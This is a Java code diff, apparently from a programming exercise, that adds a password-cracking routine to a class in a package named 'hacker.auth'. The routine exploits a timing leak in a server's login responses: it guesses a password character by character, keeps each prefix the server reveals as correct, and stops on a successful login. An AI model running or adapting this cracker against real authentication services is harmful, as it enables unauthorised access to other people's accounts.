@@ -1,10 +1,15 @@
 package hacker.auth;
 
+import hacker.app.Log;
+import hacker.models.UserCredentials;
 import hacker.util.Converter;
 import hacker.util.iter.AutoClosableIterator;
 import hacker.util.iter.AutoClosableLinesIterator;
 import hacker.util.iter.PeekableIterator;
 import hacker.util.iter.PeekingIterator;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 import java.util.NoSuchElementException;
@@ -26,6 +31,59 @@ public final class Password {
   }
 
   // CRUD-R
+
+  public static String crackUsingTimeVulnerability(
+      final DataInputStream dataIn, final DataOutputStream dataOut,
+      String login) throws IOException {
+    // Loop state
+    var padlock = RotDial.constructDialsAsm(1); // Dials used for cracking.
+    String curPwd;
+    AuthResult authResult;
+    do {
+      // Extrapolate the loop state from the `padlock`.
+      curPwd = displayEffectivePwd(padlock);
+      authResult = Client.authenticate(
+          dataIn, dataOut,
+          new UserCredentials(login, curPwd)
+      );
+      Log.authResult(authResult);
+    } while (!adjustPadlock(padlock, authResult));
+    return curPwd;
+  }
+
+  /**
+   * @return true iff padlock is configured to the correct password
+   */
+  private static boolean adjustPadlock(List<PeekingIterator<Character>> padlock,
+      AuthResult authResult) {
+    return switch (authResult.response().message()) {
+      case "Wrong password!" -> {
+        patchPadlockState(padlock, authResult);
+        yield false;
+      }
+      case "Connection success!" -> true;
+      default -> throw new RuntimeException(
+          "Unexpected request result: " + authResult);
+    };
+  }
+
+  private static void patchPadlockState(List<PeekingIterator<Character>> padlock,
+      AuthResult authResult) {
+    final String usedPassword = displayEffectivePwd(padlock);
+    if (authResult.wasTheUsedPwdAPrefixOfTheCorrectPwd()) {
+      Log.passwordPrefix(usedPassword);
+      padlock.add(RotDial.construct());
+    } else {
+      padlock.get(padlock.size() - 1).next();
+    }
+  }
+
+  private static String displayEffectivePwd(
+      List<PeekingIterator<Character>> padlock) {
+    return padlock.stream()
+        .map(pIter -> pIter.peek().toString())
+        .collect(Collectors.joining());
+  }
 
   public static PeekableIterator<String> allCombsPIter() {
     return new PeekableIterator<>() {
